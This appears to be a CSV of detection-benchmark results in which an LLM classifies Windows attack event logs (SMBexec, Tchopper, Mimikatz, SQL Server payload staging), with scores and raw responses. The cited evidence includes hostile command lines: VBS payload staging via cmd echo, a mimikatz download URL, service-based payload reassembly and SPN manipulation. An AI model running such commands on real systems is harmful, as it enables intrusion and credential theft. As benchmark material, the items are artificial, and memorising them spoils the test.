# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,ID4698-4699-Fast created & deleted task by SMBexec (sups. arg.).evtx,easy,A,processed,YES,100.0,100.0,YES,"4698, 4699",C:\WINDOWS\Temp\MpCmdRun.bat,"admmig, OFFSEC\lambda-user",C:\WINDOWS\Temp\MpCmdRun.bat,fs02.offsec.lan,,0.0,8.05,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4698, 4699
- Processes: C:\WINDOWS\Temp\MpCmdRun.bat
- Accounts: admmig, OFFSEC\lambda-user
- Commands: C:\WINDOWS\Temp\MpCmdRun.bat
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
A scheduled task named \smbservice was created and then deleted immediately by admmig. The task was configured to run C:\WINDOWS\Temp\MpCmdRun.bat, which is suspicious due to execution from C:\WINDOWS\Temp and the rapid create/delete pattern."
gpt-5.5-2026-04-23,ID5145-Remote schedule task creation (ATexec).evtx,easy,A,processed,YES,100.0,77.8,YES,5145,,admmig,,"10.23.123.11, fs01.offsec.lan",,0.0,7.19,4.7,5.0,4.0,2,15.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: None
- Accounts: admmig
- Commands: None
- Network: 10.23.123.11, fs01.offsec.lan
- Registry: None

EXPLANATION:
The events show the same account, admmig, accessing IPC$ with RelativeTargetName atsvc and then ADMIN$ with Temp\bouWFQYO.tmp from 10.23.123.11. This pattern of remote scheduled task access plus ADMIN$ temporary file activity is consistent with remote execution behavior rather than routine file access."
gpt-5.5-2026-04-23,ID4688-SQL Server payload injectection for reverse shell (MSF).evtx,easy,A,processed,YES,100.0,76.5,YES,4688,"C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe, C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe",Svc-SQL-DB01,"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, cscript  //nologo C:\Users\SVC-SQ~1\AppData\Local\Temp\UbdXv.vbs, ""C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe"" , ""C:\Windows\system32\cmd.exe"" /c echo Base64Chars = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"" &gt | &gt | %TEMP%\UbdXv.vbs &amp | echo If Len(strIn) = 0 Then &gt | echo mimedecode = -1 : Exit Function &gt | echo Else &gt | echo mimedecode = InStr(Base64Chars, strIn) - 1 &gt | echo End If &gt | echo End Function &gt | cscript //nologo %TEMP%\UbdXv.vbs",mssql01.offsec.lan,,0.0,23.89,4.6,5.0,4.0,3,16.6,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe, C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe
- Accounts: Svc-SQL-DB01
- Commands: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, cscript  //nologo C:\Users\SVC-SQ~1\AppData\Local\Temp\UbdXv.vbs, ""C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe"" , ""C:\Windows\system32\cmd.exe"" /c echo Base64Chars = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"" &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo If Len(strIn) = 0 Then &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo mimedecode = -1 : Exit Function &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Else &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo mimedecode = InStr(Base64Chars, strIn) - 1 &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo End If &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo End Function &gt;&gt;%TEMP%\UbdXv.vbs &amp; cscript //nologo %TEMP%\UbdXv.vbs
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The events show C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe repeatedly spawning C:\Windows\System32\cmd.exe under Svc-SQL-DB01 to append large base64 data into %TEMP%\feyQV.b64 and build %TEMP%\UbdXv.vbs. The script is then executed with cscript and launches C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe, indicating staged payload creation and execution from a temporary directory."
gpt-5.5-2026-04-23,ID4688-Edge payload download via command.evtx,easy,A,processed,YES,100.0,78.6,YES,4688,"C:\Program Files\Microsoft\Edge\Application\msedge.exe, C:\Windows\System32\timeout.exe, C:\Windows\System32\SecurityHealthHost.exe, C:\Windows\System32\taskkill.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","""C:\Program Files\Microsoft\Edge\Application\msedge.exe""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip , timeout  3 , ""C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data"" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data\Crashpad"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=96.0.4664.110 ""--annotation=exe=C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --annotation=plat=Win64 ""--annotation=prod=Microsoft Edge"" --annotation=ver=96.0.1054.62 --initial-client-data=0xf0,0xf4,0xf8,0xa4,0xfc,0x7ffa3209a740,0x7ffa3209a750,0x7ffa3209a760, ""C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --mojo-platform-channel-handle=5856 /prefetch:1, C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding, ""C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --mojo-platform-channel-handle=4376 /prefetch:1, taskkill  /IM ""msedge.exe"" /F","win10-02.offsec.lan, github.com",,0.0,16.71,4.7,5.0,4.0,2,15.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, C:\Windows\System32\timeout.exe, C:\Windows\System32\SecurityHealthHost.exe, C:\Windows\System32\taskkill.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip , timeout  3 , ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data"" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data\Crashpad"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=96.0.4664.110 ""--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --annotation=plat=Win64 ""--annotation=prod=Microsoft Edge"" --annotation=ver=96.0.1054.62 --initial-client-data=0xf0,0xf4,0xf8,0xa4,0xfc,0x7ffa3209a740,0x7ffa3209a750,0x7ffa3209a760, ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --mojo-platform-channel-handle=5856 /prefetch:1, C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding, ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --mojo-platform-channel-handle=4376 /prefetch:1, taskkill  /IM ""msedge.exe"" /F
- Network: win10-02.offsec.lan, github.com
- Registry: None

EXPLANATION:
The logs show admmig launching Microsoft Edge from C:\Windows\System32\cmd.exe with a command line downloading https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip. The sequence also includes timeout  3 followed by taskkill  /IM ""msedge.exe"" /F from the same parent process, which is consistent with scripted download-and-cleanup behavior involving Mimikatz."
gpt-5.5-2026-04-23,ID5145-remote service creation over SMB.evtx,easy,A,processed,YES,100.0,77.8,YES,5145,System32\WindowsPowerShell\v1.0\powershell.exe,admmig,,"10.23.123.11, srvdefender01.offsec.lan",,0.0,10.68,4.7,6.0,4.0,3,17.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: admmig
- Commands: None
- Network: 10.23.123.11, srvdefender01.offsec.lan
- Registry: None

EXPLANATION:
The same account, admmig, from 10.23.123.11 accessed \\*\ADMIN$ targeting System32\WindowsPowerShell\v1.0\powershell.exe and then accessed \\*\IPC$ targeting svcctl within the same second. This pattern indicates remote administrative access combined with service control activity, which is consistent with malicious remote execution behavior."
gpt-5.5-2026-04-23,ID5145-service massive remote creation via named pipe - Tchopper.evtx,easy,A,processed,YES,100.0,83.3,YES,5145,,admmig,,"10.23.23.9, FS03.offsec.lan",,0.0,12.93,5.0,5.0,4.0,2,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: None
- Accounts: admmig
- Commands: None
- Network: 10.23.23.9, FS03.offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated Event ID 5145 access by admmig from 10.23.23.9 to FS03.offsec.lan against \\*\IPC$ with RelativeTargetName svcctl. The sustained pattern of repeated svcctl access over many events indicates automated remote service control activity rather than a single routine file share access."
gpt-5.5-2026-04-23,"ID7000,7009,7045-Payload deployed via service - Tchopper.evtx",medium,A,processed,YES,100.0,66.7,YES,"7045, 7009, 7000, 7036","c:\windows\system32\cmd.exe, powershell",LocalSystem,"c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg2"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg3"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg245"" | select -Expand DisplayName |out-file -append tmp_payload.txt""",FS03.offsec.lan,,0.0,23.34,4.0,5.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045, 7009, 7000, 7036
- Processes: c:\windows\system32\cmd.exe, powershell
- Accounts: LocalSystem
- Commands: c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg2"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg3"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg245"" | select -Expand DisplayName |out-file -append tmp_payload.txt""
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated EventID 7045 service creations running c:\windows\system32\cmd.exe with powershell commands that retrieve service display names for sequential ""seg"" values and append them to tmp_payload.txt. This repeated service-creation pattern under LocalSystem, paired with EventID 7009 and 7000 service timeout/failure events, indicates abuse of service creation to reconstruct or stage a payload rather than routine service installation."
gpt-5.5-2026-04-23,ID7009-Service deployment time out (meterpreter).evtx,easy,B,processed,YES,100.0,100.0,YES,7009,,,,FS03.offsec.lan,,0.0,7.30,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7009
- Processes: None
- Accounts: None
- Commands: None
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
Multiple Service Control Manager 7009 timeout events occurred on FS03.offsec.lan within a short period for randomly named services gdKhvCScykzNFZKd, JyZPMMxJQxHFDMHV, and ItUrroruwhZwMrnl. The repeated creation or execution failure pattern for random service identifiers is suspicious and consistent with attack behavior rather than routine service activity."
gpt-5.5-2026-04-23,ID33205-SQL Server member added to database role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, dbo, test-sql",ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,10.54,5.6,1.0,4.0,3,13.6,C,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, dbo, test-sql
- Commands: ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The event shows OFFSEC\admmig successfully executing ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql]. Adding test-sql to db_accessadmin is a database privilege change that can grant control over database access, which is consistent with privilege escalation behavior."
gpt-5.5-2026-04-23,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, dbo, test-sql",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,11.36,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, dbo, test-sql
- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
Event 33205 shows a successful SQL Server audit event where OFFSEC\admmig executed ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]. Adding test-sql to the sysadmin role is a privileged change consistent with attack behavior or unauthorized privilege escalation."
gpt-5.5-2026-04-23,ID33205-SQL Server user linked to a database.evtx,easy,A,processed,NO,100.0,88.9,YES,33205,,"OFFSEC\admmig, dbo, test-sql",CREATE USER [test-sql] FOR LOGIN [test-sql,mssql01.offsec.lan,,0.0,7.67,5.3,6.0,4.0,3,18.3,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, dbo, test-sql
- Commands: CREATE USER [test-sql] FOR LOGIN [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
This event shows a successful SQL audit event where OFFSEC\admmig created the database user test-sql for the login test-sql. In isolation, this is consistent with routine SQL administration and there is no additional evidence of attack behavior in the provided log."
gpt-5.5-2026-04-23,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*","jump01.offsec.lan, HACK-ME-PC.offsec.lan",,0.0,13.41,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
- Accounts: lambda-user, offsec\honey-pot1
- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
- Network: jump01.offsec.lan, HACK-ME-PC.offsec.lan
- Registry: None

EXPLANATION:
The same account, lambda-user, executed setspn.exe from cmd.exe to add an MSSQLSvc SPN to offsec\honey-pot1 and then query SPNs across the offsec domain. This pattern is suspicious because SPN manipulation and broad SPN enumeration can support Kerberos service ticket abuse activity."
gpt-5.5-2026-04-23,ID4723-5145-password reset with changeNTLM (Mimikatz).evtx,easy,A,processed,NO,100.0,100.0,YES,4723,,"hacker2, admmig",,rootdc1.offsec.lan,,0.0,7.07,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4723
- Processes: None
- Accounts: hacker2, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Event 4723 shows an attempt to change the password for hacker2 by admmig. With only this single password-change event and no accompanying process, command, network, or privilege-escalation evidence, the activity cannot be determined to be malicious from the provided data alone."
gpt-5.5-2026-04-23,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",Kerberos,"admmig, hacker2, ROOTDC1$",,"rootdc1.offsec.lan, 10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,11.63,5.3,6.0,4.0,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5145, 4724, 4738
- Processes: Kerberos
- Accounts: admmig, hacker2, ROOTDC1$
- Commands: None
- Network: rootdc1.offsec.lan, 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
Multiple 4624 LogonType 3 Kerberos logons for admmig from 10.23.23.9 were followed by 5145 access to \\*\IPC$ with RelativeTargetName samr using the same SubjectLogonId 0x10E6E8EF8. The same account then generated 4724 and 4738 events for hacker2, showing a remote password reset and account change pattern consistent with malicious account manipulation."
gpt-5.5-2026-04-23,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,92.9,YES,"4728, 4756",,"honey-pot1, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, lambda-user",,rootdc1.offsec.lan,,0.0,8.01,5.6,6.0,4.0,3,18.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728, 4756
- Processes: None
- Accounts: honey-pot1, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, lambda-user
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The logs show lambda-user adding honey-pot1 to multiple highly privileged groups, including Domain Admins, Enterprise Admins, Enterprise Key Admins, and Schema Admins. This rapid privilege escalation pattern across several administrative groups indicates malicious attack behavior rather than routine activity."
gpt-5.5-2026-04-23,ID4728-Massive account group membership change.evtx,easy,A,processed,YES,100.0,96.2,YES,4728,,"CN=hack-adm-hack, OU=Test-OU, OU=OFFSEC-COMPANY, DC=offsec, DC=lan, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11, lambda-user",,rootdc1.offsec.lan,,0.0,13.62,5.8,6.0,4.0,4,19.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728
- Processes: None
- Accounts: CN=hack-adm-hack,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11, lambda-user
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
EventID 4728 shows CN=hack-adm-hack,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan being added to Group01 through Group11 by lambda-user in rapid succession. The repeated group membership additions using the same SubjectLogonId 0x8084443 indicate a suspicious bulk privilege or access expansion pattern rather than a single routine change."
gpt-5.5-2026-04-23,ID4728-Member adding to a group by the same account.evtx,easy,A,processed,YES,100.0,83.3,YES,4728,,"lambda-user, Group02",,rootdc1.offsec.lan,,0.0,15.04,5.0,2.0,4.0,4,15.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728
- Processes: None
- Accounts: lambda-user, Group02
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Event 4728 shows CN=lambda-user,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan was added to Group02. The same account, lambda-user, performed the change, indicating suspicious self-addition to a group consistent with privilege escalation behavior."
gpt-5.5-2026-04-23,ID4732-4733-Quick added-removed user from local group.evtx,easy,A,processed,YES,100.0,62.5,YES,"4732, 4733",,admmig,,jump01.offsec.lan,,0.0,8.09,3.8,5.0,4.0,3,15.8,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4732, 4733
- Processes: None
- Accounts: admmig
- Commands: None
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
The logs show admmig adding the same MemberSid to Users, Administrators, and Backup Operators on jump01.offsec.lan, followed shortly by removal from Administrators and Backup Operators. This rapid addition to privileged local groups and subsequent removal is consistent with temporary privilege escalation behavior rather than routine activity."
gpt-5.5-2026-04-23,ID4732-DNSadmin new member added.evtx,easy,A,processed,YES,100.0,83.3,YES,4732,,"CN=Test-ADM, CN=Users, DC=offsec, DC=lan, DnsAdmins, OFFSEC, admmig",,rootdc1.offsec.lan,,0.0,11.05,5.0,5.0,4.0,3,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4732
- Processes: None
- Accounts: CN=Test-ADM,CN=Users,DC=offsec,DC=lan, DnsAdmins, OFFSEC, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Event 4732 shows CN=Test-ADM,CN=Users,DC=offsec,DC=lan was added to DnsAdmins by admmig. DnsAdmins is a privileged group, so this group membership change indicates privilege escalation behavior."
gpt-5.5-2026-04-23,ID4732-User added to local admin groups.evtx,easy,A,processed,YES,100.0,100.0,YES,4732,,"admmig, Users, Administrators, Backup Operators",,jump01.offsec.lan,,0.0,10.94,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4732
- Processes: None
- Accounts: admmig, Users, Administrators, Backup Operators
- Commands: None
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated 4732 group membership changes by admmig on jump01.offsec.lan within a short time window. The same MemberSid was added to Users, Administrators, and Backup Operators, which indicates privilege escalation behavior rather than routine activity."
gpt-5.5-2026-04-23,"ID4738,5136-SPN set on user account.evtx",easy,A,processed,YES,100.0,55.6,YES,"4738, 5136",,"honey-pot1, lambda-user",,"rootdc1.offsec.lan, HACK-ME-PC.offsec.lan",,0.0,11.69,3.3,6.0,4.0,3,16.3,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4738, 5136
- Processes: None
- Accounts: honey-pot1, lambda-user
- Commands: None
- Network: rootdc1.offsec.lan, HACK-ME-PC.offsec.lan
- Registry: None

EXPLANATION:
lambda-user modified the honey-pot1 user object and added servicePrincipalName values HTTP/HACK-ME-PC.offsec.lan and MSSQLSvc/HACK-ME-PC.offsec.lan. Adding SPNs to a user account in repeated directory change events is suspicious and consistent with attack behavior targeting Kerberos service tickets."
gpt-5.5-2026-04-23,ID4738-Account is sensitive and cannot be delegated.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,rootdc1.offsec.lan,,0.0,8.91,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4738
- Processes: None
- Accounts: hack1, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Two 4738 account-change events show admmig modifying hack1 and then reverting the UserAccountControl value from 0x210 to 0x4210 and back to 0x210 within seconds. This paired temporary state change on the same account is suspicious and consistent with attack behavior intended to briefly enable an account condition and then hide the change."
gpt-5.5-2026-04-23,ID4738-Account with password not required.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,rootdc1.offsec.lan,,0.0,13.10,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4738
- Processes: None
- Accounts: hack1, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The same account, hack1, was modified twice within seconds by admmig, changing OldUacValue from 0x10 to 0x14 and then back from 0x14 to 0x10. This paired state change on the same identifier indicates a suspicious temporary account-control modification rather than a routine single administrative update."
gpt-5.5-2026-04-23,ID4738-Do not require Kerberos preauthentication.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,rootdc1.offsec.lan,,0.0,12.13,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4738
- Processes: None
- Accounts: hack1, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The same subject account admmig modified the same target account hack1 twice within seconds on rootdc1.offsec.lan. The account control value was changed from 0x210 to 0x10210 and then reverted back to 0x210, which is a suspicious paired state change pattern rather than routine account maintenance."
gpt-5.5-2026-04-23,ID4738-Password cannot be changed.evtx,easy,A,processed,NO,100.0,100.0,YES,4738,,"hack1, admmig",,rootdc1.offsec.lan,,0.0,14.17,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4738
- Processes: None
- Accounts: hack1, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The logs show two user account change events for hack1 performed by admmig within seconds. The event data does not show what attributes changed, and there are no commands, processes, registry keys, or network indicators showing attack behavior."
